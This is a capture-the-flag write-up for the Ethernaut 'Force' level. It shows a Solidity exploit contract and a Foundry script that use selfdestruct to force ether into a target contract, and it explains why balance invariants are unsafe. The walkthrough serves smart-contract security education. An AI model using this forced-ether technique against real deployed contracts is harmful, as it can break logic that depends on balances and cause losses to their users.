# Level 7 - Force ⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/7" %}

### Level Setup

{% hint style="info" %}
Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

&#x20; Things that might help:

* Fallback methods
* Sometimes the best way to attack a contract is with another contract.
* See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/Force.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```
{% endcode %}

### Exploit

The exploit uses `selfdestruct` to force funds to be sent to the contract.

1. Create an attack contract that contains funds (`1 wei`) which is then force sent to the target contract using `selfdestruct`.

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-7

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-7

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/src/Level7.sol" %}

{% code title="src/Level7.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ================================================================
// │                        LEVEL 7 - FORCE                       │
// ================================================================
contract Selfdestruct {
    function attack(address _targetContractAddress) public payable {
        selfdestruct(payable(_targetContractAddress));
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/script/Level7.s.sol" %}

{% code title="script/Level7.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {Selfdestruct} from "../src/Level7.sol";

// ================================================================
// │                          LEVEL 7 - FORCE                     │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        Selfdestruct targetContract = new Selfdestruct();
        targetContract.attack{value: 1 wei}(targetContractAddress);
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
In solidity, for a contract to be able to receive ether, the fallback function must be marked `payable`.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant `address(this).balance == 0` for any contract logic.
{% endhint %}

### Notes

{% embed url="https://eips.ethereum.org/EIPS/eip-6780" %}
